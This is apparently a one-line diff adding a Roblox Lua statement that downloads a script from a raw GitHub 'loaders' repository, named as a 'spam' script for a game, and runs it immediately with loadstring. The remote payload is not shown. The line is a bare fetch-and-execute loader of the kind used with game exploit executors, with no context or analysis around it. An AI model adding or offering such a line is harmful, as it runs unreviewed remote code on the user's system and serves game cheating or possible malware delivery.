@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BaseLizardFascinate/loaders/main/loaders/7-days-cat-sitting-spam1-71gbbokao477be.lua"))()
